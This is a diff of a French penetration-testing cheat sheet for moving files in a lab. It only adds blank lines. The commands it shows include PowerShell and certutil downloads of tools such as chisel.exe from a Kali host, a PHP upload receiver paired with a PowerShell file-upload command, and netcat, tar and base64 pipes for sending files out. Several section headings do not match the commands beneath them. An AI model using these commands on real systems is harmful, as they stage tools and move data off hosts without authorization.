@@ -15,6 +15,7 @@ Envoyer, récupérer et encoder des fichiers dans un laboratoire.
 
 ```bash
 xfreerdp /compression +auto-reconnect /u:[user] /p:'[password]' /v:[IP] +clipboard /size:1920x1080 /drive:desktop,/home/[your_username]/Desktop
+
 ```
 
 
@@ -22,6 +23,7 @@ xfreerdp /compression +auto-reconnect /u:[user] /p:'[password]' /v:[IP] +clipboa
 
 ```bash
 rdesktop -z -P -x m -u [user] -p [password] [IP] -r disk:test=/home/[your_username]/Desktop
+
 ```
 
 
@@ -33,6 +35,7 @@ rdesktop -z -P -x m -u [user] -p [password] [IP] -r disk:test=/home/[your_userna
 
 ```text
 download [file_name] [optional_file_destination_path]
+
 ```
 
 
@@ -40,6 +43,7 @@ download [file_name] [optional_file_destination_path]
 
 ```text
 upload [file_name] [optional_file_destination_path]
+
 ```
 
 
@@ -61,6 +65,7 @@ Examiner les objets, les droits et les services du domaine.
 
 ```bash
 impacket-smbserver [name_we_give_to_this_share] . -smb2support  -username my_user -password my_password
+
 ```
 
 
@@ -68,6 +73,7 @@ impacket-smbserver [name_we_give_to_this_share] . -smb2support  -username my_use
 
 ```bash
 net use m: \\[my_kali_IP]\[name_we_gave_to_the_share] /user:my_user my_password
+
 ```
 
 
@@ -82,6 +88,7 @@ Examiner les entrées et les réponses de l'application web.
 python3 -m http.server 80
 
 (new-object System.Net.WebClient).DownloadFile('http://192.168.119.138:800/chisel.exe','C:\Windows\Tasks\chisel.exe')
+
 ```
 
 
@@ -98,6 +105,7 @@ certutil -urlcache -split -f http://[kali_IP]/[file_to_download]
 
 # Depuis CMD
 powershell -Command "(New-Object Net.WebClient).DownloadFile('http://[kali_IP]/[file_to_download]', '[output_file_name_or_path]')"
+
 ```
 
 
@@ -120,6 +128,7 @@ Examiner les entrées et les réponses de l'application web.
 
   move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
 ?>
+
 ```
 
 
@@ -135,6 +144,7 @@ chmod +x upload.php
 sudo mkdir /var/www/uploads
 
 mv upload.php /var/www/uploads
+
 ```
 
 
@@ -144,6 +154,7 @@ mv upload.php /var/www/uploads
 service apache2 start
 
 ps -ef | grep apache
+
 ```
 
 
@@ -151,6 +162,7 @@ ps -ef | grep apache
 
 ```powershell
 powershell (New-Object System.Net.WebClient).UploadFile('http://<your Kali ip>/upload.php', '<file you want to transfer>')
+
 ```
 
 
@@ -158,6 +170,7 @@ powershell (New-Object System.Net.WebClient).UploadFile('http://<your Kali ip>/u
 
 ```bash
 service apache2 stop
+
 ```
 
 
@@ -176,6 +189,7 @@ nc -lvp 4444 > received_file.txt
 
 # (facultatif) Si nous avons besoin de transférer les fichiers sur une connexion chiffrée, il suffit de joindre l'option --ssl
 ncat --ssl -lvp 4444 > received_file.txt
+
 ```
 
 
@@ -186,6 +200,7 @@ nc <receiver_IP> 4444 < file_to_send.txt
 
 # (facultatif) Si nous avons besoin de recevoir les fichiers sur une connexion chiffrée, il suffit de joindre l'option --ssl
 ncat --ssl <receiver_IP> 4444 < file_to_send.txt
+
 ```
 
 
@@ -196,6 +211,7 @@ ncat --ssl <receiver_IP> 4444 < file_to_send.txt
 
 ```bash
 nc -lvp 4444 | tar xzvf -
+
 ```
 
 
@@ -203,6 +219,7 @@ nc -lvp 4444 | tar xzvf -
 
 ```bash
 tar czvf - file_or_folder_to_send | nc <receiver_IP> 4444
+
 ```
 
 
@@ -216,6 +233,7 @@ Transférer ou récupérer des fichiers dans le laboratoire.
 ```bash
 # Ceci va imprimer la chaîne Base64 directement dans le terminal, que vous pouvez copier manuellement
 base64 file_to_send.txt
+
 ```
 
 
@@ -224,6 +242,7 @@ base64 file_to_send.txt
 ```bash
 # Vous pouvez coller manuellement le contenu encodé Base64 dans un nouveau fichier
 echo "PASTE_BASE64_CONTENTS_HERE" | base64 -d > received_file.txt
+
 ```
 
 
@@ -236,6 +255,7 @@ Vérifier les ports et les services de la cible autorisée.
 
 ```bash
 nc -lvp 4444 | base64 -d > received_file.txt
+
 ```
 
 
@@ -243,6 +263,7 @@ nc -lvp 4444 | base64 -d > received_file.txt
 
 ```bash
 base64 file_to_send.txt | nc <receiver_IP> 4444
+
 ```
 
 ---
